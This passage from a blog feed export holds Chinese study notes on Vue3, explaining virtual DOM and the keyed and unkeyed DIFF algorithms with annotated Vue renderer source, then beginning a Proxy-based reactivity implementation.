    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="虚拟DOM"><a href="#虚拟DOM" class="headerlink" title="虚拟DOM"></a>虚拟DOM</h1><p>虚拟DOM就是通过JS生成的AST抽象语法树（编译原理），很多语言的编译都会使用AST，例如TS转JS，ES6转ES5等。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305022054195.png"></p>
<p>一个DOM的属性非常多，直接操作DOM浪费性能，而操作JS就非常快。</p>
<p>所以就有了虚拟DOM，它不仅提升速度，还利于做算法的优化，例如DIFF算法就是为了实现DOM的复用。</p>
<h1 id="DIFF算法"><a href="#DIFF算法" class="headerlink" title="DIFF算法"></a>DIFF算法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">  	&lt;div :key=&quot;index&quot; v-for=&quot;(item, index) in arr&quot;&gt;</span><br><span class="line">      &#123;&#123; item &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">  const arr = [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;]</span><br><span class="line">  </span><br><span class="line">  // 向数组中插入一个新元素</span><br><span class="line">  arr.splice(2, 0, &quot;114514&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/runtime-core/src/renderer.ts</code>）中可以看到DIFF算法，分为有key和无key两种情况。</p>
<h2 id="无key"><a href="#无key" class="headerlink" title="无key"></a>无key</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305022218648.png"></p>
<p>没有对元素进行复用，而是全部重新渲染（旧的换成新的），浪费性能。</p>
<p>key可以给元素做唯一标记，这些元素得以能够被复用。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">patchUnkeyedChildren</span> = (<span class="params"></span></span><br><span class="line"><span class="params">    c1: VNode[],    <span class="comment">// 旧的VNode</span></span></span><br><span class="line"><span class="params">    c2: VNodeArrayChildren,     <span class="comment">// 新的VNode</span></span></span><br><span class="line"><span class="params">    container: RendererElement,</span></span><br><span class="line"><span class="params">    anchor: RendererNode | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentComponent: ComponentInternalInstance | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentSuspense: SuspenseBoundary | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    isSVG: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    slotScopeIds: <span class="built_in">string</span>[] | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    optimized: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params">  </span>) =&gt; &#123;</span><br><span class="line">    c1 = c1 || <span class="variable constant_">EMPTY_ARR</span></span><br><span class="line">    c2 = c2 || <span class="variable constant_">EMPTY_ARR</span></span><br><span class="line">    <span class="keyword">const</span> oldLength = c1.<span class="property">length</span></span><br><span class="line">    <span class="keyword">const</span> newLength = c2.<span class="property">length</span></span><br><span class="line">    <span class="keyword">const</span> commonLength = <span class="title class_">Math</span>.<span class="title function_">min</span>(oldLength, newLength)</span><br><span class="line">    <span class="keyword">let</span> i</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; commonLength; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> nextChild = (c2[i] = optimized</span><br><span class="line">        ? <span class="title function_">cloneIfMounted</span>(c2[i] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">        : <span class="title function_">normalizeVNode</span>(c2[i]))</span><br><span class="line">      <span class="comment">// 重新渲染元素</span></span><br><span class="line">      <span class="title function_">patch</span>(</span><br><span class="line">        c1[i],</span><br><span class="line">        nextChild,</span><br><span class="line">        container,</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">        parentComponent,</span><br><span class="line">        parentSuspense,</span><br><span class="line">        isSVG,</span><br><span class="line">        slotScopeIds,</span><br><span class="line">        optimized</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldLength &gt; newLength) &#123;</span><br><span class="line">      <span class="comment">// remove old 删除元素</span></span><br><span class="line">      <span class="title function_">unmountChildren</span>(</span><br><span class="line">        c1,</span><br><span class="line">        parentComponent,</span><br><span class="line">        parentSuspense,</span><br><span class="line">        <span class="literal">true</span>,</span><br><span class="line">        <span class="literal">false</span>,</span><br><span class="line">        commonLength</span><br><span class="line">      )</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// mount new 新增元素</span></span><br><span class="line">      <span class="title function_">mountChildren</span>(</span><br><span class="line">        c2,</span><br><span class="line">        container,</span><br><span class="line">        anchor,</span><br><span class="line">        parentComponent,</span><br><span class="line">        parentSuspense,</span><br><span class="line">        isSVG,</span><br><span class="line">        slotScopeIds,</span><br><span class="line">        optimized,</span><br><span class="line">        commonLength</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="有key"><a href="#有key" class="headerlink" title="有key"></a>有key</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305022236151.png"></p>
<blockquote>
<p>和Vue2的双端DIFF算法不一样，Vue2按头-头→尾-尾→头-尾→尾-头进行对比，而Vue3只有头-头→尾-尾</p>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305022246793.png"></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">patchKeyedChildren</span> = (<span class="params"></span></span><br><span class="line"><span class="params">    c1: VNode[],</span></span><br><span class="line"><span class="params">    c2: VNodeArrayChildren,</span></span><br><span class="line"><span class="params">    container: RendererElement,</span></span><br><span class="line"><span class="params">    parentAnchor: RendererNode | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentComponent: ComponentInternalInstance | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    parentSuspense: SuspenseBoundary | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    isSVG: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    slotScopeIds: <span class="built_in">string</span>[] | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">    optimized: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params">  </span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> l2 = c2.<span class="property">length</span></span><br><span class="line">    <span class="keyword">let</span> e1 = c1.<span class="property">length</span> - <span class="number">1</span> <span class="comment">// prev ending index</span></span><br><span class="line">    <span class="keyword">let</span> e2 = l2 - <span class="number">1</span> <span class="comment">// next ending index</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. sync from start 前序算法，只对比前面的</span></span><br><span class="line">    <span class="comment">// (a b) c</span></span><br><span class="line">    <span class="comment">// (a b) d e</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= e1 &amp;&amp; i &lt;= e2) &#123;</span><br><span class="line">      <span class="keyword">const</span> n1 = c1[i]</span><br><span class="line">      <span class="keyword">const</span> n2 = (c2[i] = optimized</span><br><span class="line">        ? <span class="title function_">cloneIfMounted</span>(c2[i] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">        : <span class="title function_">normalizeVNode</span>(c2[i]))</span><br><span class="line">      <span class="comment">// 判断两元素的type和key是否一样，如果一样才进行复用</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">isSameVNodeType</span>(n1, n2)) &#123;</span><br><span class="line">        <span class="title function_">patch</span>(</span><br><span class="line">          n1,</span><br><span class="line">          n2,</span><br><span class="line">          container,</span><br><span class="line">          <span class="literal">null</span>,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          isSVG,</span><br><span class="line">          slotScopeIds,</span><br><span class="line">          optimized</span><br><span class="line">        )</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      i++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. sync from end 尾序算法，只对比后面的</span></span><br><span class="line">    <span class="comment">// a (b c)</span></span><br><span class="line">    <span class="comment">// d e (b c)</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= e1 &amp;&amp; i &lt;= e2) &#123;</span><br><span class="line">      <span class="keyword">const</span> n1 = c1[e1]</span><br><span class="line">      <span class="keyword">const</span> n2 = (c2[e2] = optimized</span><br><span class="line">        ? <span class="title function_">cloneIfMounted</span>(c2[e2] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">        : <span class="title function_">normalizeVNode</span>(c2[e2]))</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">isSameVNodeType</span>(n1, n2)) &#123;</span><br><span class="line">        <span class="title function_">patch</span>(</span><br><span class="line">          n1,</span><br><span class="line">          n2,</span><br><span class="line">          container,</span><br><span class="line">          <span class="literal">null</span>,</span><br><span class="line">          parentComponent,</span><br><span class="line">          parentSuspense,</span><br><span class="line">          isSVG,</span><br><span class="line">          slotScopeIds,</span><br><span class="line">          optimized</span><br><span class="line">        )</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      e1--</span><br><span class="line">      e2--</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. common sequence + mount 新增节点</span></span><br><span class="line">    <span class="comment">// (a b)</span></span><br><span class="line">    <span class="comment">// (a b) c</span></span><br><span class="line">    <span class="comment">// i = 2, e1 = 1, e2 = 2</span></span><br><span class="line">    <span class="comment">// (a b)</span></span><br><span class="line">    <span class="comment">// c (a b)</span></span><br><span class="line">    <span class="comment">// i = 0, e1 = -1, e2 = 0</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt; e1) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt;= e2) &#123;</span><br><span class="line">        <span class="keyword">const</span> nextPos = e2 + <span class="number">1</span></span><br><span class="line">        <span class="keyword">const</span> anchor = nextPos &lt; l2 ? (c2[nextPos] <span class="keyword">as</span> <span class="title class_">VNode</span>).<span class="property">el</span> : parentAnchor</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= e2) &#123;</span><br><span class="line">          <span class="comment">// 如果参数1为null，patch函数即为新增节点</span></span><br><span class="line">          <span class="title function_">patch</span>(</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            (c2[i] = optimized</span><br><span class="line">              ? <span class="title function_">cloneIfMounted</span>(c2[i] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">              : <span class="title function_">normalizeVNode</span>(c2[i])),</span><br><span class="line">            container,</span><br><span class="line">            anchor,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG,</span><br><span class="line">            slotScopeIds,</span><br><span class="line">            optimized</span><br><span class="line">          )</span><br><span class="line">          i++</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. common sequence + unmount 卸载元素</span></span><br><span class="line">    <span class="comment">// (a b) c</span></span><br><span class="line">    <span class="comment">// (a b)</span></span><br><span class="line">    <span class="comment">// i = 2, e1 = 2, e2 = 1</span></span><br><span class="line">    <span class="comment">// a (b c)</span></span><br><span class="line">    <span class="comment">// (b c)</span></span><br><span class="line">    <span class="comment">// i = 0, e1 = 0, e2 = -1</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; e2) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt;= e1) &#123;</span><br><span class="line">        <span class="title function_">unmount</span>(c1[i], parentComponent, parentSuspense, <span class="literal">true</span>)</span><br><span class="line">        i++</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. unknown sequence 乱序，最难的情况</span></span><br><span class="line">    <span class="comment">// [i ... e1 + 1]: a b [c d e] f g</span></span><br><span class="line">    <span class="comment">// [i ... e2 + 1]: a b [e d c h] f g</span></span><br><span class="line">    <span class="comment">// i = 2, e1 = 4, e2 = 5</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> s1 = i <span class="comment">// prev starting index</span></span><br><span class="line">      <span class="keyword">const</span> s2 = i <span class="comment">// next starting index</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 5.1 build key:index map for newChildren 构建新节点的映射关系（map）</span></span><br><span class="line">      <span class="comment">// key值 1 2 3 4 5</span></span><br><span class="line">      <span class="comment">// 索引 0 1 2 3 4</span></span><br><span class="line">      <span class="comment">// 进行排序操作</span></span><br><span class="line">	  <span class="comment">// key值 5 4 3 2 1</span></span><br><span class="line">      <span class="comment">// 索引 0 1 2 3 4（不变）</span></span><br><span class="line">      <span class="comment">// 5=&gt;0 4=&gt;1 3=&gt;2 2=&gt;3 1=&gt;4</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">keyToNewIndexMap</span>: <span class="title class_">Map</span>&lt;<span class="built_in">string</span> | <span class="built_in">number</span> | <span class="built_in">symbol</span>, <span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">      <span class="keyword">for</span> (i = s2; i &lt;= e2; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> nextChild = (c2[i] = optimized</span><br><span class="line">          ? <span class="title function_">cloneIfMounted</span>(c2[i] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">          : <span class="title function_">normalizeVNode</span>(c2[i]))</span><br><span class="line">        <span class="keyword">if</span> (nextChild.<span class="property">key</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (__DEV__ &amp;&amp; keyToNewIndexMap.<span class="title function_">has</span>(nextChild.<span class="property">key</span>)) &#123;</span><br><span class="line">            <span class="title function_">warn</span>(</span><br><span class="line">              <span class="string">`Duplicate keys found during update:`</span>,</span><br><span class="line">              <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(nextChild.<span class="property">key</span>),</span><br><span class="line">              <span class="string">`Make sure keys are unique.`</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">          keyToNewIndexMap.<span class="title function_">set</span>(nextChild.<span class="property">key</span>, i)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 5.2 loop through old children left to be patched and try to patch</span></span><br><span class="line">      <span class="comment">// matching nodes &amp; remove nodes that are no longer present</span></span><br><span class="line">      <span class="comment">// 记录新节点在旧节点中的位置数组</span></span><br><span class="line">      <span class="comment">// [5, 4, 3, 2, 1]</span></span><br><span class="line">      <span class="keyword">let</span> j</span><br><span class="line">      <span class="keyword">let</span> patched = <span class="number">0</span></span><br><span class="line">      <span class="keyword">const</span> toBePatched = e2 - s2 + <span class="number">1</span></span><br><span class="line">      <span class="keyword">let</span> moved = <span class="literal">false</span></span><br><span class="line">      <span class="comment">// used to track whether any node has moved</span></span><br><span class="line">      <span class="keyword">let</span> maxNewIndexSoFar = <span class="number">0</span></span><br><span class="line">      <span class="comment">// works as Map&lt;newIndex, oldIndex&gt;</span></span><br><span class="line">      <span class="comment">// Note that oldIndex is offset by +1</span></span><br><span class="line">      <span class="comment">// and oldIndex = 0 is a special value indicating the new node has</span></span><br><span class="line">      <span class="comment">// no corresponding old node.</span></span><br><span class="line">      <span class="comment">// used for determining longest stable subsequence</span></span><br><span class="line">      <span class="keyword">const</span> newIndexToOldIndexMap = <span class="keyword">new</span> <span class="title class_">Array</span>(toBePatched)</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; toBePatched; i++) newIndexToOldIndexMap[i] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = s1; i &lt;= e1; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> prevChild = c1[i]</span><br><span class="line">        <span class="keyword">if</span> (patched &gt;= toBePatched) &#123;</span><br><span class="line">          <span class="comment">// all new children have been patched so this can only be a removal</span></span><br><span class="line">          <span class="comment">// 如果有多余的旧节点就删除</span></span><br><span class="line">          <span class="title function_">unmount</span>(prevChild, parentComponent, parentSuspense, <span class="literal">true</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> newIndex</span><br><span class="line">        <span class="keyword">if</span> (prevChild.<span class="property">key</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">          newIndex = keyToNewIndexMap.<span class="title function_">get</span>(prevChild.<span class="property">key</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// key-less node, try to locate a key-less node of the same type</span></span><br><span class="line">          <span class="keyword">for</span> (j = s2; j &lt;= e2; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">              newIndexToOldIndexMap[j - s2] === <span class="number">0</span> &amp;&amp;</span><br><span class="line">              <span class="title function_">isSameVNodeType</span>(prevChild, c2[j] <span class="keyword">as</span> <span class="title class_">VNode</span>)</span><br><span class="line">            ) &#123;</span><br><span class="line">              newIndex = j</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果新节点不包含在旧节点里也删除</span></span><br><span class="line">        <span class="keyword">if</span> (newIndex === <span class="literal">undefined</span>) &#123;</span><br><span class="line">          <span class="title function_">unmount</span>(prevChild, parentComponent, parentSuspense, <span class="literal">true</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          newIndexToOldIndexMap[newIndex - s2] = i + <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> (newIndex &gt;= maxNewIndexSoFar) &#123;</span><br><span class="line">            maxNewIndexSoFar = newIndex</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果节点出现交叉，说明是要移动，求最长递增子序列</span></span><br><span class="line">            moved = <span class="literal">true</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">patch</span>(</span><br><span class="line">            prevChild,</span><br><span class="line">            c2[newIndex] <span class="keyword">as</span> <span class="title class_">VNode</span>,</span><br><span class="line">            container,</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG,</span><br><span class="line">            slotScopeIds,</span><br><span class="line">            optimized</span><br><span class="line">          )</span><br><span class="line">          patched++</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 5.3 move and mount</span></span><br><span class="line">      <span class="comment">// generate longest stable subsequence only when nodes have moved</span></span><br><span class="line">      <span class="comment">// 求最长递增子序列升序</span></span><br><span class="line">      <span class="keyword">const</span> increasingNewIndexSequence = moved</span><br><span class="line">        ? <span class="title function_">getSequence</span>(newIndexToOldIndexMap)</span><br><span class="line">        : <span class="variable constant_">EMPTY_ARR</span></span><br><span class="line">      j = increasingNewIndexSequence.<span class="property">length</span> - <span class="number">1</span></span><br><span class="line">      <span class="comment">// looping backwards so that we can use last patched node as anchor</span></span><br><span class="line">      <span class="keyword">for</span> (i = toBePatched - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> nextIndex = s2 + i</span><br><span class="line">        <span class="keyword">const</span> nextChild = c2[nextIndex] <span class="keyword">as</span> <span class="title class_">VNode</span></span><br><span class="line">        <span class="keyword">const</span> anchor =</span><br><span class="line">          nextIndex + <span class="number">1</span> &lt; l2 ? (c2[nextIndex + <span class="number">1</span>] <span class="keyword">as</span> <span class="title class_">VNode</span>).<span class="property">el</span> : parentAnchor</span><br><span class="line">        <span class="keyword">if</span> (newIndexToOldIndexMap[i] === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="comment">// mount new</span></span><br><span class="line">          <span class="title function_">patch</span>(</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            nextChild,</span><br><span class="line">            container,</span><br><span class="line">            anchor,</span><br><span class="line">            parentComponent,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG,</span><br><span class="line">            slotScopeIds,</span><br><span class="line">            optimized</span><br><span class="line">          )</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (moved) &#123;</span><br><span class="line">          <span class="comment">// move if:</span></span><br><span class="line">          <span class="comment">// There is no stable subsequence (e.g. a reverse)</span></span><br><span class="line">          <span class="comment">// OR current node is not among the stable sequence</span></span><br><span class="line">          <span class="comment">// 如果当前遍历的节点不在子序列，说明要进行移动</span></span><br><span class="line">          <span class="keyword">if</span> (j &lt; <span class="number">0</span> || i !== increasingNewIndexSequence[j]) &#123;</span><br><span class="line">            <span class="title function_">move</span>(nextChild, container, anchor, <span class="title class_">MoveType</span>.<span class="property">REORDER</span>)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果在子序列里，跳过</span></span><br><span class="line">            j--</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://en.wikipedia.org/wiki/Longest_increasing_subsequence</span></span><br><span class="line"><span class="comment">// 贪心+二分查找，求最长递增子序列</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSequence</span>(<span class="params">arr: <span class="built_in">number</span>[]</span>): <span class="built_in">number</span>[] &#123;</span><br><span class="line">  <span class="keyword">const</span> p = arr.<span class="title function_">slice</span>()</span><br><span class="line">  <span class="keyword">const</span> result = [<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">let</span> i, j, u, v, c</span><br><span class="line">  <span class="keyword">const</span> len = arr.<span class="property">length</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> arrI = arr[i]</span><br><span class="line">    <span class="keyword">if</span> (arrI !== <span class="number">0</span>) &#123;</span><br><span class="line">      j = result[result.<span class="property">length</span> - <span class="number">1</span>]</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &lt; arrI) &#123;</span><br><span class="line">        p[i] = j</span><br><span class="line">        result.<span class="title function_">push</span>(i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      u = <span class="number">0</span></span><br><span class="line">      v = result.<span class="property">length</span> - <span class="number">1</span></span><br><span class="line">      <span class="keyword">while</span> (u &lt; v) &#123;</span><br><span class="line">        c = (u + v) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (arr[result[c]] &lt; arrI) &#123;</span><br><span class="line">          u = c + <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          v = c</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (arrI &lt; arr[result[u]]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          p[i] = result[u - <span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        result[u] = i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  u = result.<span class="property">length</span></span><br><span class="line">  v = result[u - <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">while</span> (u-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    result[u] = v</span><br><span class="line">    v = p[v]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3响应式原理</title>
    <url>/web/study/Vue/9.Vue3%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue2的不足"><a href="#Vue2的不足" class="headerlink" title="Vue2的不足"></a>Vue2的不足</h1><p>Vue2使用<code>Object.defineProperty</code>实现响应式，它有一些不足：</p>
<ul>
<li><p>对象只能劫持事先定义好的数据，新增的数据需要<code>Vue.Set(xxx)</code></p>
</li>
<li><p>数组只能使用七种（Vue重写后的）数组方法操作，使用下标修改某一项值就无法被劫持</p>
<blockquote>
<p><code>Object.defineProperty</code>其实可以做到数组修改，但是会产生性能问题</p>
</blockquote>
</li>
</ul>
<h1 id="reactive的实现"><a href="#reactive的实现" class="headerlink" title="reactive的实现"></a>reactive的实现</h1><p>Vue3使用ES6的Proxy实现响应式。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; track, trigger &#125; <span class="keyword">from</span> <span class="string">&quot;./effect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否为对象</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = (<span class="params">target:<span class="built_in">any</span></span>)=&gt; target!=<span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> target == <span class="string">&quot;object&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现对象的响应式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> reactive = &lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt;(<span class="attr">target</span>: T): <span class="function"><span class="params">T</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, &#123;</span><br><span class="line">    <span class="comment">// 属性读取操作的捕捉器</span></span><br><span class="line">    <span class="comment">// target:当前的对象 key:对象的属性 receiver:proxy或继承proxy的对象</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params">target, key, receiver</span>) &#123;</span><br><span class="line">      <span class="comment">// 有些情况下会造成上下文的错乱</span></span><br><span class="line">      <span class="comment">// return target[key]</span></span><br><span class="line">      <span class="comment">// 这样（有receiver）可以保证上下文的正确</span></span><br><span class="line">      <span class="keyword">let</span> res = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, key, receiver)</span><br><span class="line">      <span class="title function_">track</span>(target, key)</span><br><span class="line">      <span class="comment">// 递归监听嵌套对象</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_">isObject</span>(res)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">reactive</span>(res <span class="keyword">as</span> <span class="built_in">object</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 属性设置操作的捕捉器</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">target, key, value, receiver</span>) &#123;</span><br><span class="line">      <span class="comment">// Reflect.set返回一个布尔值</span></span><br><span class="line">      <span class="keyword">let</span> res = <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, key, value, receiver)</span><br><span class="line">      <span class="title function_">trigger</span>(target, key)</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// delete操作符的捕捉器</span></span><br><span class="line">    <span class="comment">// deleteProperty() &#123;</span></span><br><span class="line">    <span class="comment">// &#125;,</span></span><br><span class="line">    <span class="comment">// 函数调用操作的捕捉器</span></span><br><span class="line">    <span class="comment">// apply() &#123;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// 等，每种对象操作都有其捕捉器</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="effect"><a href="#effect" class="headerlink" title="effect"></a>effect</h1><p>activeEffect收集副作用函数，初始化时也会调用一下，主要用来进行视图的改变。</p>
